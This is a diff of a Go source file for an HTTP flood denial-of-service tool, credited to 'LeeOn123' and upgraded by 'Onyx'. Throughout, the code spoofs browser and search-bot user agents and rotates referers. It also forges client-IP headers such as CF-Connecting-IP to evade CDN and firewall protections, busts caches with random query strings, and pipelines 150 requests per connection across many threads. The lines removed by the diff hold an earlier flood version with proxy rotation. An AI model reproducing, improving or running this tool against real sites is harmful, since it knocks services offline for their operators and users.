@@ -1,330 +1,376 @@
+/*
+Coded by LeeOn123
+Upgraded 2026 by Onyx for baby
+Original structure kept, power massively increased
+*/
+
 package main
 
 import (
 	"bufio"
-	"context"
 	"crypto/tls"
-	"flag"
 	"fmt"
 	"io"
 	"math/rand"
 	"net"
-	"net/http"
 	"net/url"
 	"os"
-	"os/signal"
 	"strconv"
 	"strings"
-	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
-
-	"golang.org/x/net/http2"
 )
 
 var (
-	targetURL   string
-	threads     int
-	duration    int
-	method      string
-	proxyFile   string
-	headerFile  string
-	http3       bool
-	pipelining  int
-	requests    int64
-	errors      int64
-	startTime   time.Time
-)
+	host      = ""
+	port      = "80"
+	page      = ""
+	mode      = ""
+	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM0123456789"
+	start     = make(chan bool)
+	requests  int64
+	errors    int64
 
-var (
-	userAgents = []string{
-		// Chrome 2025-2026
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-		// Firefox
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
-		// Safari
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
-		// Edge
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
-		// Mobile
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+	// Expanded & modern Accept headers
+	acceptall = []string{
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9,id;q=0.8\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: utf-8\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
+		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: en-US,en;q=0.9\r\n",
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: utf-8\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
 	}
 
-	acceptHeaders = []string{
-		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"*/*",
+	// Modern 2025-2026 User-Agents
+	choice  = []string{"Macintosh", "Windows", "X11"}
+	choice2 = []string{"Intel Mac OS X 10_15_7", "Intel Mac OS X 14_0", "Intel Mac OS X 15_0"}
+	choice3 = []string{"Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64", "Windows NT 11.0; Win64; x64"}
+	choice4 = []string{"Linux x86_64", "Linux i686", "X11; Ubuntu; Linux x86_64"}
+	choice5 = []string{"chrome", "firefox", "safari", "edge", "spider"}
+	choice6 = []string{"WOW64", "Win64; x64", "Win64; IA64"}
+
+	spider = []string{
+		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+		"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+		"AdsBot-Google (+http://www.google.com/adsbot.html)",
+		"Googlebot-Image/1.0",
+		"Googlebot-News",
+		"Googlebot-Video/1.0",
+		"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 	}
 
+	// Expanded referers
 	referers = []string{
-		"https://www.google.com/",
 		"https://www.google.com/search?q=",
+		"https://www.google.com/",
 		"https://www.bing.com/search?q=",
 		"https://duckduckgo.com/?q=",
 		"https://www.youtube.com/",
 		"https://www.facebook.com/",
+		"https://www.instagram.com/",
 		"https://twitter.com/",
 		"https://www.reddit.com/",
-		"https://www.instagram.com/",
 		"https://www.tiktok.com/",
+		"https://www.cia.gov/",
+		"https://www.fbi.gov/",
+		"https://steamcommunity.com/market/search?q=",
+		"https://www.ted.com/search?q=",
+		"https://play.google.com/store/search?q=",
+		"https://github.com/search?q=",
 		"https://news.ycombinator.com/",
-		"https://github.com/",
-	}
-
-	languages = []string{
-		"en-US,en;q=0.9",
-		"en-GB,en;q=0.9",
-		"en-US,en;q=0.9,id;q=0.8",
-		"id-ID,id;q=0.9,en;q=0.8",
-		"en-US,en;q=0.5",
+		"https://www.linkedin.com/",
+		"https://www.pinterest.com/search/pins/?q=",
+		"https://www.quora.com/search?q=",
 	}
 )
 
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
+func getuseragent() string {
+	platform := choice[rand.Intn(len(choice))]
+	var os string
+	if platform == "Macintosh" {
+		os = choice2[rand.Intn(len(choice2))]
+	} else if platform == "Windows" {
+		os = choice3[rand.Intn(len(choice3))]
+	} else {
+		os = choice4[rand.Intn(len(choice4))]
+	}
+
+	browser := choice5[rand.Intn(len(choice5))]
+
+	switch browser {
+	case "chrome":
+		// Chrome 128-133 range (2025-2026)
+		major := rand.Intn(6) + 128
+		build := rand.Intn(9000) + 1000
+		patch := rand.Intn(200)
+		webkit := strconv.Itoa(rand.Intn(50) + 537)
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/%s.36", os, webkit, major, build, patch, webkit)
+	case "firefox":
+		// Firefox 130-135
+		ver := rand.Intn(6) + 130
+		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, ver, ver)
+	case "safari":
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.%d Safari/605.1.15", os, rand.Intn(3)+1)
+	case "edge":
+		major := rand.Intn(6) + 128
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Edg/%d.0.0.0", os, major, major)
+	default:
+		return spider[rand.Intn(len(spider))]
+	}
+}
+
+func contain(char string, x string) int {
+	for i := 0; i < len(char); i++ {
+		if string(char[i]) == x {
+			return 1
+		}
+	}
+	return 0
+}
+
+func randomIP() string {
+	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(256))
+}
+
+func bypassHeaders() string {
+	ip := randomIP()
+	return "X-Forwarded-For: " + ip + "\r\n" +
+		"X-Real-IP: " + ip + "\r\n" +
+		"X-Client-IP: " + ip + "\r\n" +
+		"CF-Connecting-IP: " + ip + "\r\n" +
+		"True-Client-IP: " + ip + "\r\n" +
+		"X-Originating-IP: " + ip + "\r\n" +
+		"X-Remote-IP: " + ip + "\r\n" +
+		"X-Remote-Addr: " + ip + "\r\n"
+}
+
+func flood() {
+	addr := host + ":" + port
+	header := ""
+
+	if mode == "get" {
+		header += " HTTP/1.1\r\nHost: "
+		header += host + "\r\n"
+		if os.Args[5] == "nil" {
+			header += "Connection: keep-alive\r\n"
+			header += "Cache-Control: no-cache\r\n"
+			header += "Pragma: no-cache\r\n"
+			header += "Upgrade-Insecure-Requests: 1\r\n"
+			header += "Sec-Fetch-Dest: document\r\n"
+			header += "Sec-Fetch-Mode: navigate\r\n"
+			header += "Sec-Fetch-Site: none\r\n"
+			header += "Sec-Fetch-User: ?1\r\n"
+			header += "User-Agent: " + getuseragent() + "\r\n"
+			header += acceptall[rand.Intn(len(acceptall))]
+			header += "Referer: " + referers[rand.Intn(len(referers))] + randString(8) + "\r\n"
+			header += bypassHeaders()
+		} else {
+			fi, err := os.Open(os.Args[5])
+			if err != nil {
+				fmt.Printf("Error: %s\n", err)
+				return
+			}
+			defer fi.Close()
+			br := bufio.NewReader(fi)
+			for {
+				a, _, c := br.ReadLine()
+				if c == io.EOF {
+					break
+				}
+				header += string(a) + "\r\n"
+			}
+		}
+	} else if mode == "post" {
+		data := "f"
+		if os.Args[5] != "nil" {
+			fi, err := os.Open(os.Args[5])
+			if err != nil {
+				fmt.Printf("Error: %s\n", err)
+				return
+			}
+			defer fi.Close()
+			br := bufio.NewReader(fi)
+			for {
+				a, _, c := br.ReadLine()
+				if c == io.EOF {
+					break
+				}
+				header += string(a) + "\r\n"
+			}
+		}
+		header += "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\n"
+		header += "Connection: keep-alive\r\n"
+		header += "Content-Type: application/x-www-form-urlencoded\r\n"
+		header += "Content-Length: " + strconv.Itoa(len(data)) + "\r\n"
+		header += "Accept-Encoding: gzip, deflate, br, zstd\r\n"
+		header += "User-Agent: " + getuseragent() + "\r\n"
+		header += acceptall[rand.Intn(len(acceptall))]
+		header += bypassHeaders()
+		header += "\r\n" + data + "\r\n"
+	}
+
+	var s net.Conn
+	var err error
+	<-start
+
+	for {
+		if port == "443" {
+			cfg := &tls.Config{
+				InsecureSkipVerify: true,
+				ServerName:         host,
+				MinVersion:         tls.VersionTLS12,
+				MaxVersion:         tls.VersionTLS13,
+				NextProtos:         []string{"h2", "http/1.1"},
+			}
+			s, err = tls.Dial("tcp", addr, cfg)
+		} else {
+			s, err = net.DialTimeout("tcp", addr, 10*time.Second)
+		}
+
+		if err != nil {
+			atomic.AddInt64(&errors, 1)
+			// small backoff
+			time.Sleep(time.Millisecond * 50)
+			continue
+		}
+
+		// Send many requests per connection (stronger keep-alive abuse)
+		for i := 0; i < 150; i++ {
+			request := ""
+			if mode == "get" {
+				// Stronger cache-busting
+				request += "GET " + page
+				if contain(page, "?") == 0 {
+					request += "?"
+				} else {
+					request += "&"
+				}
+				request += "r=" + strconv.Itoa(rand.Intn(2147483647)) +
+					"&_=" + strconv.FormatInt(time.Now().UnixNano(), 10) +
+					"&v=" + randString(6) +
+					string(abcd[rand.Intn(len(abcd))]) +
+					string(abcd[rand.Intn(len(abcd))]) +
+					string(abcd[rand.Intn(len(abcd))])
+			}
+			request += header + "\r\n"
+
+			_, err := s.Write([]byte(request))
+			if err != nil {
+				break
+			}
+			atomic.AddInt64(&requests, 1)
+		}
+		s.Close()
+	}
+}
+
 func randString(n int) string {
-	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, n)
 	for i := range b {
-		b[i] = letters[rand.Intn(len(letters))]
+		b[i] = abcd[rand.Intn(len(abcd))]
 	}
 	return string(b)
 }
 
-func randomIP() string {
-	return fmt.Sprintf("%d.%d.%d.%d",
-		rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(255))
-}
-
-func buildHeaders(req *http.Request) {
-	ua := userAgents[rand.Intn(len(userAgents))]
-	req.Header.Set("User-Agent", ua)
-	req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
-	req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
-	req.Header.Set("Connection", "keep-alive")
-	req.Header.Set("Cache-Control", "no-cache")
-	req.Header.Set("Pragma", "no-cache")
-	req.Header.Set("Upgrade-Insecure-Requests", "1")
-	req.Header.Set("Sec-Fetch-Dest", "document")
-	req.Header.Set("Sec-Fetch-Mode", "navigate")
-	req.Header.Set("Sec-Fetch-Site", "none")
-	req.Header.Set("Sec-Fetch-User", "?1")
-	req.Header.Set("Sec-Ch-Ua", `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`)
-	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
-	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
-
-	// Cache bust + referer
-	ref := referers[rand.Intn(len(referers))]
-	if strings.Contains(ref, "q=") {
-		ref += randString(8)
-	}
-	req.Header.Set("Referer", ref)
-
-	// Spoofed headers
-	req.Header.Set("X-Forwarded-For", randomIP())
-	req.Header.Set("X-Real-IP", randomIP())
-	req.Header.Set("X-Client-IP", randomIP())
-	req.Header.Set("CF-Connecting-IP", randomIP())
-	req.Header.Set("True-Client-IP", randomIP())
-}
-
-func loadProxies(path string) []string {
-	if path == "" {
-		return nil
-	}
-	f, err := os.Open(path)
-	if err != nil {
-		return nil
-	}
-	defer f.Close()
-	var list []string
-	sc := bufio.NewScanner(f)
-	for sc.Scan() {
-		line := strings.TrimSpace(sc.Text())
-		if line != "" {
-			list = append(list, line)
-		}
-	}
-	return list
-}
-
-func createClient(proxy string) *http.Client {
-	transport := &http.Transport{
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-			MinVersion:         tls.VersionTLS12,
-			MaxVersion:         tls.VersionTLS13,
-			NextProtos:         []string{"h2", "http/1.1"},
-		},
-		MaxIdleConns:        10000,
-		MaxIdleConnsPerHost: 1000,
-		MaxConnsPerHost:     0,
-		IdleConnTimeout:     90 * time.Second,
-		DisableKeepAlives:   false,
-		ForceAttemptHTTP2:   true,
-		DialContext: (&net.Dialer{
-			Timeout:   10 * time.Second,
-			KeepAlive: 30 * time.Second,
-		}).DialContext,
-	}
-
-	http2.ConfigureTransport(transport)
-
-	if proxy != "" {
-		proxyURL, err := url.Parse(proxy)
-		if err == nil {
-			transport.Proxy = http.ProxyURL(proxyURL)
-		}
-	}
-
-	return &http.Client{
-		Transport: transport,
-		Timeout:   15 * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-	}
-}
-
-func floodWorker(ctx context.Context, wg *sync.WaitGroup, proxies []string) {
-	defer wg.Done()
-
-	var client *http.Client
-	proxyIdx := 0
-	if len(proxies) > 0 {
-		client = createClient(proxies[rand.Intn(len(proxies))])
-	} else {
-		client = createClient("")
-	}
-
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-			// Build randomized URL
-			u, _ := url.Parse(targetURL)
-			q := u.Query()
-			q.Set("_", strconv.FormatInt(time.Now().UnixNano(), 10))
-			q.Set("r", randString(12))
-			u.RawQuery = q.Encode()
-
-			req, err := http.NewRequestWithContext(ctx, method, u.String(), nil)
-			if err != nil {
-				atomic.AddInt64(&errors, 1)
-				continue
-			}
-
-			buildHeaders(req)
-
-			// Optional body for POST
-			if method == "POST" {
-				body := strings.NewReader("data=" + randString(32) + "&token=" + randString(16))
-				req.Body = io.NopCloser(body)
-				req.ContentLength = int64(body.Len())
-				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-			}
-
-			resp, err := client.Do(req)
-			if err != nil {
-				atomic.AddInt64(&errors, 1)
-				// rotate proxy on error
-				if len(proxies) > 0 {
-					proxyIdx = (proxyIdx + 1) % len(proxies)
-					client = createClient(proxies[proxyIdx])
-				}
-				continue
-			}
-			io.Copy(io.Discard, resp.Body)
-			resp.Body.Close()
-			atomic.AddInt64(&requests, 1)
-		}
-	}
-}
-
-func stats(ctx context.Context) {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		case <-ticker.C:
-			r := atomic.LoadInt64(&requests)
-			e := atomic.LoadInt64(&errors)
-			elapsed := time.Since(startTime).Seconds()
-			rps := float64(r) / elapsed
-			fmt.Printf("\r[+] Sent: %d | Errors: %d | RPS: %.0f | Elapsed: %.0fs", r, e, rps, elapsed)
-		}
-	}
-}
-
 func main() {
-	flag.StringVar(&targetURL, "url", "", "Target URL (required)")
-	flag.IntVar(&threads, "t", 500, "Number of concurrent workers")
-	flag.IntVar(&duration, "d", 60, "Duration in seconds")
-	flag.StringVar(&method, "m", "GET", "HTTP method (GET/POST)")
-	flag.StringVar(&proxyFile, "proxy", "", "Proxy list file (optional)")
-	flag.StringVar(&headerFile, "headers", "", "Custom headers file (optional)")
-	flag.BoolVar(&http3, "http3", false, "Enable HTTP/3 (experimental)")
-	flag.IntVar(&pipelining, "pipe", 1, "Requests per connection (pipelining)")
-	flag.Parse()
+	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
+	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
+	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
+	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
+	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
+	fmt.Println("                          ||                                             ")
+	fmt.Println("                         .||              Golang version 2026 (Upgraded) ")
+	fmt.Println("                                                      C0DED BY RexxUs + Onyx")
+	fmt.Println("==========================================================================")
 
-	if targetURL == "" {
-		fmt.Println("Usage: ./flood -url https://target.com -t 1000 -d 120 -m GET -proxy proxies.txt")
-		fmt.Println("Options:")
-		flag.PrintDefaults()
+	if len(os.Args) != 6 {
+		fmt.Println("Post Mode will use header.txt as data")
+		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
+		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
 		os.Exit(1)
 	}
 
-	method = strings.ToUpper(method)
-	if method != "GET" && method != "POST" {
-		fmt.Println("Method must be GET or POST")
+	u, err := url.Parse(os.Args[1])
+	if err != nil {
+		fmt.Println("Please input a correct url")
 		os.Exit(1)
 	}
 
-	rand.Seed(time.Now().UnixNano())
-
-	proxies := loadProxies(proxyFile)
-	if len(proxies) > 0 {
-		fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
+	tmp := strings.Split(u.Host, ":")
+	host = tmp[0]
+	if u.Scheme == "https" {
+		port = "443"
+	} else {
+		port = u.Port()
+	}
+	if port == "" {
+		port = "80"
+	}
+	page = u.Path
+	if page == "" {
+		page = "/"
 	}
 
-	fmt.Printf("[+] Target   : %s\n", targetURL)
-	fmt.Printf("[+] Threads  : %d\n", threads)
-	fmt.Printf("[+] Duration : %d seconds\n", duration)
-	fmt.Printf("[+] Method   : %s\n", method)
-	fmt.Println("[+] Starting flood...")
+	if os.Args[3] != "get" && os.Args[3] != "post" {
+		fmt.Println("Wrong mode, Only can use \"get\" or \"post\"")
+		os.Exit(1)
+	}
+	mode = os.Args[3]
 
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	defer cancel()
+	threads, err := strconv.Atoi(os.Args[2])
+	if err != nil {
+		fmt.Println("Threads should be a integer")
+		os.Exit(1)
+	}
 
-	// Handle Ctrl+C
-	sig := make(chan os.Signal, 1)
-	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sig
-		fmt.Println("\n[!] Stopping...")
-		cancel()
-	}()
+	limit, err := strconv.Atoi(os.Args[4])
+	if err != nil {
+		fmt.Println("limit should be a integer")
+		os.Exit(1)
+	}
 
-	startTime = time.Now()
-	var wg sync.WaitGroup
-
-	go stats(ctx)
+	fmt.Printf("[+] Target  : %s\n", os.Args[1])
+	fmt.Printf("[+] Threads : %d\n", threads)
+	fmt.Printf("[+] Mode    : %s\n", mode)
+	fmt.Printf("[+] Time    : %d seconds\n", limit)
+	fmt.Println("[+] Starting...")
 
 	for i := 0; i < threads; i++ {
-		wg.Add(1)
-		go floodWorker(ctx, &wg, proxies)
+		time.Sleep(time.Microsecond * 50) // faster spawn
+		go flood()
+		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+		os.Stdout.Sync()
 	}
 
-	wg.Wait()
+	fmt.Println("\nFlood will end in " + os.Args[4] + " seconds.")
+	close(start)
+
+	// Live stats
+	go func() {
+		for {
+			time.Sleep(1 * time.Second)
+			r := atomic.LoadInt64(&requests)
+			e := atomic.LoadInt64(&errors)
+			fmt.Printf("\r[+] Sent: %d | Errors: %d", r, e)
+		}
+	}()
+
+	time.Sleep(time.Duration(limit) * time.Second)
 	fmt.Printf("\n[+] Finished. Total requests: %d | Errors: %d\n",
 		atomic.LoadInt64(&requests), atomic.LoadInt64(&errors))
 }
